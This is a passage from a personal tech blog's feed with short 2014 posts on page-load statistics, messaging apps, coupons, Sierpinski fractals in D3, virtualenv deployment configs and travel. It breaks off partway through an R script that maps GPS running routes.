        <img src="http://dangoldin.com/assets/static/images/crawl-stats-times-mean.png" alt="Mean times" width="600" height="1000" layout="responsive"/>
      </a>
      <p>
        <strong>Average load time.</strong> To get a general sense of the data this plots the average time it took to load each URL. The interesting piece here is that multiple foreign sites take a while to load (163.com, qq.com, gmw.cn, ..) - I suspect a big reason is that there's quite a bit of latency since I'm based in the US. Another observation is that many news sites tended to load slowly (huffingpost.com, cnn.com, cnet.com). The Google sites loaded extremely quickly (all less than 1 sec) as did Wikipedia.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-times-boxplot.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-times-boxplot.png" alt="Time boxplot" width="600" height="1000" layout="responsive"/>
      </a>
      <p>
        <strong>Load time boxplot.</strong> This provides a bit more information on the load times by showing the min/max values as well as the median and the percentiles. Not a significant amount of new insight here.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-requests-count.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-requests-count.png" alt="Number of requests" width="600" height="1000" layout="responsive"/>
      </a>
      <p>
        <strong>Number of requests.</strong> Huge variance here as well - rakuten.co.jp loaded almost 800 external files while the Google sites are all less than 10.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-requests-vs-time.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-requests-vs-time.png" alt="Requests vs time" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Number of request vs time to load.</strong> This leads to the question of whether sites that are loading more files take a longer time to load. By plotting a scatter plot between the two it's pretty clear that all things being equal more files increase page load time.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-regression.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-regression.png" alt="Requests vs time regression" width="476" height="274" layout="responsive"/>
      </a>
      <p>
        <strong>Number of requests vs time to load linear fit.</strong> A simple regression of load time as a function of the number of file requets confirms this. On average, each additional file leads to an additional 20 milliseconds of load.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-file-types-count.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-file-types-count.png" alt="File type frequency" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>File type frequency.</strong> We can also take a look at the most common type of file requested. As expected, images are the majority of requests followed by JavaScript.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-file-types-url.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-file-types-url.png" alt="File type by url" width="600" height="1000" layout="responsive"/>
      </a>
      <p>
        <strong>File types by url.</strong> Not a lot of insight here but the colors sure are pretty. One thing that does standout is that if a site has a significant amount of file requests they tend to be of multiple types.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-file-types-correlation.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-file-types-correlation.png" alt="File types correlation" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>File type correlation.</strong> We can plot a simple correlation of file type found on a page to see whether there are any file types that tend to be included together. Not much going on here.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-regression-multiple.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-regression-multiple.png" alt="Multiple linear regression results" width="486" height="418" layout="responsive"/>
      </a>
      <p>
        <strong>Multiple linear regression.</strong> And just for fun we can run a regression to see whether a particular file type leads to significantly worse load than others. I was hoping to show that having a lot of JavaScript hurts performance but that doesn't seem to be the case. I suspect it's due to the innate time differences it takes to load some sites (in particular sites outside the US) vs others.
      </p>
    </div>
  </li>
</ul>

<p>As usual, the code’s up on <a href="https://github.com/dangoldin/site-analysis" target="_blank">GitHub</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Follow the WhatsApp money</title>
   <link href="http://dangoldin.com/2014/03/06/follow-the-whatsapp-money/"/>
   <updated>2014-03-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/03/06/follow-the-whatsapp-money</id>
   <content:encoded><![CDATA[
<p>Earlier this week I received the following email from imo.im:</p>

<img src="http://dangoldin.com/assets/static/images/imo-announcement.png" width="688" height="781" layout="responsive"/>

<p>It’s amazing what $19 billion can do. For years imo.im has supported third party chat clients but within a couple of weeks of the WhatsApp acquisition they’ve abandoned that support to focus on their own network and become the next WhatsApp. For a while now they’ve been building features to support this move - videos in August, stickers in January - and I wonder what would have happened if they focused on their platform earlier. Now they’re just playing catch up to WhatsApp, Kik, Line, and countless others. Timing is critical and I suspect it’s too late for imo.im to be entering the first party messaging fray.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Trained for discounts</title>
   <link href="http://dangoldin.com/2014/03/02/trained-for-discounts/"/>
   <updated>2014-03-02T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/03/02/trained-for-discounts</id>
   <content:encoded><![CDATA[
<p>Nearly every week I receive an $8 off $25 coupon from delivery.com. I’m sure the intent is to generate awareness and develop a habit but it’s having the opposite effect on me: I’m being trained to only order when I have a coupon. Couponing is tough - too little and it will have no impact but too much and you run the risk of training your customers to only react to deals which will result in you needing to have higher prices to maintain your margin.</p>

<p>I recall reading that the retail clothing industry is essentially sales and coupons. Since people are trained to only buy on sales, retailers will set an initial high price and use discounts to drop it to something that will appeal to consumers. No wonder clothing retailers have sales practically every week and definitely every holiday. Ron Johnson tried changing this when he became the CEO of JCPenney but wasn’t able to do it before his ouster. I suspect even if he had more time he wouldn’t have been able to do it without the support of other retailers. Even then, each would have a strong incentive to deviate, a la <a href="https://en.wikipedia.org/wiki/Prisoner's_dilemma">Prisoner’s Dilemma</a>, so they might just end up exactly where they started.</p>

<p>This begs the question of why other industries haven’t embraced the discounting model. My guess is that it would take a significant amount of effort to change consumer perception that a single company wouldn’t be able to apply and it’s just too complicated to orchestrate - especially when the payoffs are uncertain since competitors can quickly move to this model as well.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Blog posts are now tagged</title>
   <link href="http://dangoldin.com/2014/02/26/blog-posts-are-now-tagged/"/>
   <updated>2014-02-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/26/blog-posts-are-now-tagged</id>
   <content:encoded><![CDATA[
<p>Turns out that tagging and categorizing blog posts is more difficult than I thought. I start with one set of tags but as I go through my posts I realize that my initial set of tags no longer make sense and I need to restart. The challenge is finding the set of tags that are specific enough to categorize a single post yet general enough that they can be applied to other ones. I haven’t found the perfect set of tags yet but did manage to go through and tag each of <a href="/tags/">my posts</a>. Over time I hope to improve the tag taxonomy and update the existing posts. I’d love to hear suggestions on how to effectively organize my posts and examples of other blogs that are doing this well.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>More Sierpinski fun</title>
   <link href="http://dangoldin.com/2014/02/21/more-sierpinski-fun/"/>
   <updated>2014-02-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/21/more-sierpinski-fun</id>
   <content:encoded><![CDATA[
<p>As a follow up to my previous <a href="http://dangoldin.com/2014/02/19/sierpinski-triangle-in-d3/">post</a>, I modified my Sierpinski generation <a href="http://dangoldin.com/assets/static/js/d3.sierpinski.v2.js">code</a> to allow specifying the number of sides and the distance ratio for each iteration of the loop. The Sierpinski triangle can be generated with 3 sides and a distance ratio of 0.5. Increasing the number of sides and decreasing the ratio leads to some interesting patterns - it looks as if for a given N, we get N shapes each consisting of N shapes. I suspect this is a fractal pattern - similar to the triangle - but it’s difficult to confirm given a fixed screen resolution. I’d love to know what’s going on here and whether there’s a relationship between the number of sides and the distance ratio.</p>

<ul class="thumbnails">
  <li class="span3">
    <div class="thumbnail no-border">
      <img alt="N=4, ratio=0.4" src="http://dangoldin.com/assets/static/images/sierpinski-fun-4-0.4.png" style="width:100%" width="459" height="453" layout="responsive"/>
      <p class="center">
        N = 4, ratio = 0.4
      </p>
    </div>
  </li>
  <li class="span3">
    <div class="thumbnail no-border">
      <img alt="N=10, ratio=0.2" src="http://dangoldin.com/assets/static/images/sierpinski-fun-10-0.2.png" style="width:100%" width="181" height="180" layout="responsive"/>
      <p class="center">
        N = 10, ratio = 0.2
      </p>
    </div>
  </li>
</ul>

<form class="form form-horizontal" id="sierpinski-options-form">
  <div class="control-group">
    <label class="control-label" for="id-sierpinski-sides"># of sides</label>
    <div class="controls">
      <input type="text" name="sides" id="id-sierpinski-sides" placeholder="3,4,.." />
    </div>
  </div>

  <div class="control-group">
    <label class="control-label" for="id-sierpinski-ratio">Distance ratio</label>
    <div class="controls">
      <input type="text" name="ratio" id="id-sierpinski-ratio" placeholder="0.5" />
    </div>
  </div>

  <div class="control-group">
    <div class="controls">
      <button id="id-sierpinski-generate" class="btn btn-primary">Generate!</button>
    </div>
  </div>
</form>

<div id="canvas">
</div>

<script type="text/javascript" src="http://dangoldin.com/assets/static/js/d3.v3.min.js"></script>

<script type="text/javascript" src="http://dangoldin.com/assets/static/js/d3.layout.cloud.js"></script>

<script type="text/javascript" src="http://dangoldin.com/assets/static/js/d3.sierpinski.v2.js"></script>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Sierpinski triangle in D3</title>
   <link href="http://dangoldin.com/2014/02/19/sierpinski-triangle-in-d3/"/>
   <updated>2014-02-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/19/sierpinski-triangle-in-d3</id>
   <content:encoded><![CDATA[
<p>There’s a little known algorithm for constructing a <a href="https://en.wikipedia.org/wiki/Sierpinski_triangle" target="_blank">Sierpinski triangle</a> that is surprisingly easy to implement.</p>

<ol>
  <li>Start the three vertices that form a triangle</li>
  <li>Pick a random point inside the triangle</li>
  <li>Pick a random vertex</li>
  <li>Go halfway from a the random point to the vertex and mark that point</li>
  <li>Go to step 3 using the result of 4 as the starting point</li>
</ol>

<p>I’m trying to get better at D3 and thought it would be a good exercise to code it up. The resulting image is below (generated using 10,000 points) and the JavaScript is in the following <a href="http://dangoldin.com/assets/static/js/d3.sierpinski.js">file</a>. Next up is to write a new script that allows a user to specify the number of vertices and the adjustment factor - the <a href="https://en.wikipedia.org/wiki/Sierpinski_carpet" target="_blank">Sierpinski carpet</a> can be generated with 4 vertices and a distance adjustment factor of a third rather than a half.</p>

<div id="canvas-triangle">
</div>

<script type="text/javascript" src="http://dangoldin.com/assets/static/js/d3.v3.min.js"></script>

<script type="text/javascript" src="http://dangoldin.com/assets/static/js/d3.layout.cloud.js"></script>

<script type="text/javascript" src="http://dangoldin.com/assets/static/js/d3.sierpinski.js"></script>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Heuristic vs algorithmic approaches</title>
   <link href="http://dangoldin.com/2014/02/15/heuristic-vs-algorithmic-approaches/"/>
   <updated>2014-02-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/15/heuristic-vs-algorithmic-approaches</id>
   <content:encoded><![CDATA[
<p>Something that’s come up frequently in my quantitative work is balancing heuristic and algorithmic approaches. It’s surprisingly difficult to get the first attempt at an algorithmic approach working properly - it’s not an academic exercise and real world issues will always appear. Over time I’ve found myself writing heuristic checks and tweaks to deal with the various edge cases the algorithmic approach encounters. For example, setting the min and max bounds on the results of a function or adjusting the slope of a curve if it ends up being set in the wrong direction.</p>

<p>It makes me wonder why I didn’t just start with a heuristic approach and worked on an algorithmic approach later after I’ve collected enough data and had a better understanding of the environment. The challenge is that a heuristic approach is only a temporary solution. It will be be difficult to maintain and improving it will require additional hacks and tweaks. A heuristic approach is great at setting a quick baseline but long term improvement will only come from a more rigorous approach.</p>

<p>An example would be writing an algorithm that bids on Google Adwords. A heuristic approach would take yesterday’s bids on a set of keywords, look at their performance, and adjust them or down based on a few simple rules. A simple heuristic might be to allocate budgets to different keywords based on their conversion rates. Unfortunately, this wouldn’t handle the case of different keywords having different costs and volume. Incorporating these would require additional rules and introduce more complexity.</p>

<p>An algorithmic approach would be to model the relationship between cost, impressions, and click through rates for each keyword and then optimize for total conversions. Each model would be designed to predict a dependent variable based on a set of independent variables and would require a statistical approach to make sure the results were statistically significant and safe to use. Each model would require its own research and set of tests but would lead to a more scalable system. Since the models would be independent of one another, you’d be able to improve them individually. It may turn out that our cost calculation model is great but the one that estimates impressions needs more improvement. Now you can focus on the model that needs the most work rather than trying to globally optimize the whole system.</p>

<p>As with anything, these are tools and their usage depends on the situation. It’s difficult to come up with a rule of when to use one over the other but I tend to favor heuristics when I need to do something quick and know it’s not going to require significant changes. If it’s a complicated problem that will require ongoing work, I’ll opt for the more rigorous, algorithmic approach. It will take more work initially but will be better in the long term.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Foursquare as a contact book</title>
   <link href="http://dangoldin.com/2014/02/13/foursquare-as-a-contact-book/"/>
   <updated>2014-02-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/13/foursquare-as-a-contact-book</id>
   <content:encoded><![CDATA[
<p>A few days ago I discovered a new use case for Foursquare when I was meeting up with a friend. We were catching up and during the course of the conversation I realized I needed to introduce him to someone I had met earlier. Unfortunately, I completely blanked on his name and company. All I recalled was that he frequently checked into his company on Foursquare. Sure enough, when I opened up Foursquare I saw that he had checked in there that morning.</p>

<p>Clearly Foursquare isn’t a contact book app but it provided enough adjacent information and triggered enough thoughts to come in handy. It’s not surprising that we use apps and products in unintended ways but it’s always great being able to catch ourselves in the act.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Using virtualenv in production</title>
   <link href="http://dangoldin.com/2014/02/10/using-virtualenv-in-production/"/>
   <updated>2014-02-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/10/using-virtualenv-in-production</id>
   <content:encoded><![CDATA[
<p>One of my favorite things about Python is being able to use <a href="http://www.virtualenv.org/en/latest/index.html" target="_blank">virtualenv</a> to create isolated environments. It’s extremely simple to use and allows you to have different versions of Python libraries used by different projects.</p>

<p>The thing that’s tricky is getting virtualenv set up on a production environment under different services since each one requires a slightly different configuration. I’ve gone through my projects and collected the various ways I’ve gotten it running for different services. I’m sure I could have done it differently but the following worked for me and will hopefully come in handy to others. If you have any questions or I’m not being clear enough let me know and I’ll updat the post with more information.</p>

<ul>
  <li>Nginx and Gunicorn under Supervisor.

  <p><a href="http://nginx.org/" target="_blank">Nginx</a> - The configuration isn't anything different than normal except that you may need to specify some specific paths that are within your virtualenv</p>

<figure class="highlight"><pre><code class="language-nginx" data-lang="nginx">  <span class="k">Static</span> <span class="s">files</span> <span class="s">needs</span> <span class="s">to</span> <span class="s">point</span> <span class="s">to</span> <span class="s">virtualenv</span> <span class="s">directory</span>
<span class="s">location</span> <span class="n">/static/admin</span> <span class="p">{</span>
  <span class="kn">autoindex</span> <span class="no">on</span><span class="p">;</span>
  <span class="kn">root</span>   <span class="n">/home/ubuntu/app/venv/lib/python2.7/site-packages/django/contrib/admin/</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>


  <p><a href="http://gunicorn.org/" target="_blank">Gunicorn</a> - I have a shell script here that's used to set the various paths and options that configure Gunicorn</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="nb">set</span> <span class="nt">-e</span>
<span class="nv">DJANGODIR</span><span class="o">=</span>/home/ubuntu/app
<span class="nv">DJANGO_SETTINGS_MODULE</span><span class="o">=</span>app.settings.prod

<span class="nv">LOGFILE</span><span class="o">=</span>/var/log/gunicorn/guni-app.log
<span class="nv">LOGDIR</span><span class="o">=</span><span class="si">$(</span><span class="nb">dirname</span> <span class="nv">$LOGFILE</span><span class="si">)</span>
<span class="nv">NUM_WORKERS</span><span class="o">=</span>2
<span class="c"># user/group to run as</span>
<span class="nv">USER</span><span class="o">=</span>ubuntu
<span class="nv">GROUP</span><span class="o">=</span>ubuntu
<span class="nb">cd</span> /home/ubuntu/app
<span class="nb">source</span> /home/ubuntu/app/venv/bin/activate

<span class="nb">export </span><span class="nv">DJANGO_SETTINGS_MODULE</span><span class="o">=</span><span class="nv">$DJANGO_SETTINGS_MODULE</span>
<span class="nb">export </span><span class="nv">PYTHONPATH</span><span class="o">=</span><span class="nv">$DJANGODIR</span>:<span class="nv">$PYTHONPATH</span>

<span class="nb">test</span> <span class="nt">-d</span> <span class="nv">$LOGDIR</span> <span class="o">||</span> <span class="nb">mkdir</span> <span class="nt">-p</span> <span class="nv">$LOGDIR</span>
<span class="nb">exec</span> /home/ubuntu/app/venv/bin/gunicorn_django <span class="nt">-w</span> <span class="nv">$NUM_WORKERS</span> <span class="se">\</span>
  <span class="nt">--user</span><span class="o">=</span><span class="nv">$USER</span> <span class="nt">--group</span><span class="o">=</span><span class="nv">$GROUP</span> <span class="nt">--log-level</span><span class="o">=</span>debug <span class="se">\</span>
  <span class="nt">--log-file</span><span class="o">=</span><span class="nv">$LOGFILE</span> <span class="nt">-b</span> 0.0.0.0:8000 2&gt;&gt;<span class="nv">$LOGFILE</span></code></pre></figure>


  <p><a href="http://supervisord.org/" target="_blank">Supevisor</a> - Here we just point our configuration file to the shell script for Gunicorn</p>

<figure class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="nn">[program:gunicorn-myapp]</span>
<span class="py">directory</span> <span class="p">=</span> <span class="s">/home/ubuntu/myapp</span>
<span class="py">user</span> <span class="p">=</span> <span class="s">ubuntu</span>
<span class="py">command</span> <span class="p">=</span> <span class="s">/home/ubuntu/myapp/scripts/start.sh</span>
<span class="py">stdout_logfile</span> <span class="p">=</span> <span class="s">/var/log/gunicorn/myapp-std.log</span>
<span class="py">stderr_logfile</span> <span class="p">=</span> <span class="s">/var/log/gunicorn/myapp-err.log</span></code></pre></figure>

  </li>

<li><a href="http://www.celeryproject.org/" target="_blank">Celery</a> under Supervisor.

<p>In this case we just configure Supervisor to start virtualenv path for celery. A cool feature is being able to specify the environment variables - in my case to pass in the Django settings module.</p>


<figure class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="nn">[program:celery]</span>
<span class="c">; Set full path to celery program if using virtualenv
</span><span class="py">command</span><span class="p">=</span><span class="s">/home/ubuntu/myapp/venv/bin/celery worker -A myapp --loglevel=INFO</span>

<span class="py">directory</span><span class="p">=</span><span class="s">/home/ubuntu/myapp</span>
<span class="py">user</span><span class="p">=</span><span class="s">nobody</span>
<span class="py">numprocs</span><span class="p">=</span><span class="s">1</span>
<span class="py">stdout_logfile</span><span class="p">=</span><span class="s">/var/log/celery/worker.log</span>
<span class="py">stderr_logfile</span><span class="p">=</span><span class="s">/var/log/celery/worker.log</span>
<span class="py">autostart</span><span class="p">=</span><span class="s">true</span>
<span class="py">autorestart</span><span class="p">=</span><span class="s">true</span>
<span class="py">startsecs</span><span class="p">=</span><span class="s">10</span>

<span class="py">environment</span> <span class="p">=</span>
  <span class="py">DJANGO_SETTINGS_MODULE</span><span class="p">=</span><span class="s">myapp.settings.prod</span></code></pre></figure>

</li>

<li><a href="http://docs.fabfile.org/en/1.8/" target="_blank">Fabric</a>.

<p>The idea here is to make sure all our remote install commands are run after activiating the virtualenv.</p>


<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">with_statement</span>
<span class="kn">from</span> <span class="nn">fabric.api</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">contextlib</span> <span class="kn">import</span> <span class="n">contextmanager</span> <span class="k">as</span> <span class="n">_contextmanager</span>

<span class="n">env</span><span class="p">.</span><span class="n">activate</span> <span class="o">=</span> <span class="s">'source /home/ubuntu/myapp/venv/bin/activate'</span>
<span class="n">env</span><span class="p">.</span><span class="n">directory</span> <span class="o">=</span> <span class="s">'/home/ubuntu/myapp'</span>

<span class="o">@</span><span class="n">_contextmanager</span>
<span class="k">def</span> <span class="nf">virtualenv</span><span class="p">():</span>
    <span class="k">with</span> <span class="n">cd</span><span class="p">(</span><span class="n">env</span><span class="p">.</span><span class="n">directory</span><span class="p">):</span>
        <span class="k">with</span> <span class="n">prefix</span><span class="p">(</span><span class="n">env</span><span class="p">.</span><span class="n">activate</span><span class="p">):</span>
            <span class="k">yield</span>

<span class="o">@</span><span class="n">hosts</span><span class="p">(</span><span class="n">env</span><span class="p">.</span><span class="n">roledefs</span><span class="p">[</span><span class="s">'db'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">rebuild_index</span><span class="p">():</span>
    <span class="k">with</span> <span class="n">virtualenv</span><span class="p">():</span>
        <span class="n">run</span><span class="p">(</span><span class="s">"python manage.py rebuild_index"</span><span class="p">)</span></code></pre></figure>

</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Travel more</title>
   <link href="http://dangoldin.com/2014/02/09/travel-more/"/>
   <updated>2014-02-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/09/travel-more</id>
   <content:encoded><![CDATA[
<p>Now that I’ve started blogging I realize how important traveling is to creativity. After my trip to India I had a ton of different blog ideas. Some came from comparing the two cultures - for example cab rides and mobile phone business while others just came from realizations, such as the lack of truly global technology products. Many dismiss travel as a luxury but it’s a great way to bring a new perspective and let thoughts settle. In my case, it felt as if these connections formed subconsciously based on what I’ve been thinking about and doing actively for a year. It’s not surprising that our conscious experiences drive these subconscious connections but it’s interesting how stark this realization was. Prior to blogging, I never would have had an idea and immediately think of writing about it but it’s become a consistent thought. Travel encourages this serendipitous thought and companies should be encouraging it. Instead, many black ball employees who take a vacation and make employees feel guilty for taking some time off.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing GPS data in R</title>
   <link href="http://dangoldin.com/2014/02/05/visualizing-gps-data-in-r/"/>
   <updated>2014-02-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/05/visualizing-gps-data-in-r</id>
   <content:encoded><![CDATA[
<p>Earlier today I read Nathan Yau’s <a href="http://flowingdata.com/2014/02/05/where-people-run/" target="_blank">post</a> that had a quick <a href="http://projects.flowingdata.com/tut/map-routes.R" target="_blank">R script</a> to plot GPX file data onto a map. I was able to quickly load up my RunKeeper data from 2013 and came up with a pretty cool visualization of each of my outdoor runs. Since my runs occurred across multiple cities and continents the visualization turned out to be very sparse without a great sense of where the runs were. I made a two quick changes to the script to make it more useful for my data: a map overlay to see where in the world I ran and an ability to view a zoomed in area of the map. I’ve included the updated script and the resulting plots below.</p>

<figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="c1"># From Nathan's script</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">plotKML</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">ggplot2</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">maps</span><span class="p">)</span><span class="w">

</span><span class="c1"># GPX files downloaded from Runkeeper</span><span class="w">
</span><span class="n">files</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">dir</span><span class="p">(</span><span class="n">pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\\.gpx"</span><span class="p">)</span><span class="w">

</span><span class="c1"># Consolidate routes in one drata frame</span><span class="w">
</span><span class="n">index</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">()</span><span class="w">
</span><span class="n">lat</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">()</span><span class="w">
</span><span class="n">long</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">()</span><span class="w">
</span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span><span class="o">:</span><span class="nf">length</span><span class="p">(</span><span class="n">files</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">

  </span><span class="n">route</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">readGPX</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w">
  </span><span class="n">location</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">route</span><span class="o">$</span><span class="n">tracks</span><span class="p">[[</span><span class="m">1</span><span class="p">]][[</span><span class="m">1</span><span class="p">]]</span><span class="w">

  </span><span class="n">index</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="w"> </span><span class="nf">rep</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="nf">dim</span><span class="p">(</span><span class="n">location</span><span class="p">)[</span><span class="m">1</span><span class="p">]))</span><span class="w">
  </span><span class="n">lat</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">location</span><span class="o">$</span><span class="n">lat</span><span class="p">)</span><span class="w">
  </span><span class="n">long</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">location</span><span class="o">$</span><span class="n">lon</span><span class="p">)</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="n">routes</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data.frame</span><span class="p">(</span><span class="n">cbind</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="w"> </span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">long</span><span class="p">))</span><span class="w">

</span><span class="c1"># Map the routes</span><span class="w">
</span><span class="n">ids</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">unique</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="w">
</span><span class="n">plot</span><span class="p">(</span><span class="n">routes</span><span class="o">$</span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">routes</span><span class="o">$</span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">"n"</span><span class="p">,</span><span class="w"> </span><span class="n">axes</span><span class="o">=</span><span class="kc">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">xlab</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">ylab</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">main</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">asp</span><span class="o">=</span><span class="m">1</span><span class="p">)</span><span class="w">
</span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span><span class="o">:</span><span class="nf">length</span><span class="p">(</span><span class="n">ids</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="n">currRoute</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">subset</span><span class="p">(</span><span class="n">routes</span><span class="p">,</span><span class="w"> </span><span class="n">index</span><span class="o">==</span><span class="n">ids</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w">
  </span><span class="n">lines</span><span class="p">(</span><span class="n">currRoute</span><span class="o">$</span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">currRoute</span><span class="o">$</span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">col</span><span class="o">=</span><span class="s2">"#FF000020"</span><span class="p">)</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c1"># Add the world map overlay</span><span class="w">
</span><span class="n">world</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">map_data</span><span class="p">(</span><span class="s1">'world'</span><span class="p">)</span><span class="w">
</span><span class="n">plot</span><span class="p">(</span><span class="n">world</span><span class="o">$</span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">world</span><span class="o">$</span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">"n"</span><span class="p">,</span><span class="w"> </span><span class="n">axes</span><span class="o">=</span><span class="kc">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">xlab</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">ylab</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">main</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">asp</span><span class="o">=</span><span class="m">1</span><span class="p">)</span><span class="w">

</span><span class="n">world_groups</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">unique</span><span class="p">(</span><span class="n">world</span><span class="o">$</span><span class="n">group</span><span class="p">)</span><span class="w">
</span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span><span class="o">:</span><span class="nf">length</span><span class="p">(</span><span class="n">world_groups</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="n">currRoute</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">subset</span><span class="p">(</span><span class="n">world</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="o">==</span><span class="n">world_groups</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w">
